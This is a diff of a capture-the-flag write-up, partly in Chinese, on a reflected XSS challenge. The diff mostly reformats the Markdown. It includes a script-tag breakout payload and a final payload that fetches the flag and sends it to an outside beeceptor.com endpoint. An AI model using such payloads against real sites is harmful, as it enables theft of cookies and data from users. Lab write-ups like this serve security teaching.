@@ -12,17 +12,15 @@ date: 2023-02-09
 Challenge: http://h4ck3r.quest:8800/
 
 ## Background
-:::spoiler
 攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取`COOKIE`之類的)
 ![](https://i.imgur.com/lZ0bj41.png)
 
 ![](https://i.imgur.com/grJXpr7.png)
 
 ![](https://i.imgur.com/q9fwa6z.png)
-:::
 
 ## Source code
-```javascript!
+```javascript
 ...
 <script>
     const message = {"icon": "error", "titleText": "User not found.", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true};
@@ -35,7 +33,7 @@ Challenge: http://h4ck3r.quest:8800/
 
 ## Exploit
 1. Check XSS
-    ```javascript!
+    ```javascript
     ...
     <script>
         const message = {"icon": "error", "titleText": "youshallnotpass", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true};
@@ -48,7 +46,7 @@ Challenge: http://h4ck3r.quest:8800/
     ![](https://i.imgur.com/OffMAUF.png)
 2. Try to inject script tag
 Payload: `http://h4ck3r.quest:8800/?type=error&message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E//`
-    ```javascript!
+    ```javascript
     ...
     <script>
         const message = {"icon": "error", "titleText": "</script><script>alert(123)</script>//", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true};
@@ -58,13 +56,12 @@ Payload: `http://h4ck3r.quest:8800/?type=error&message=%3C/script%3E%3Cscript%3E
     </script>
     ```
     ![](https://i.imgur.com/1cZJvIv.png)
-* Hint
-If you login as guest(password = guest), then you can get the response
+* Hint: If you login as guest(password = guest), then you can get the response
 ![](https://i.imgur.com/s2R75Xf.png)
 
 3. Fetch flag and send to [beeceptor](https://beeceptor.com/)
-Payload: 
-    ```!
+    * Payload: 
+    ```
     http://h4ck3r.quest:8800/?message=%3C/script%3E%3Cscript%3Efetch(`/getflag\).then(r=%3Er.text()).then(flag=%3Elocation.href=`https://sbk6401.free.beeceptor.com/?f=${flag}`)%3C/script%3E//
     ```
 
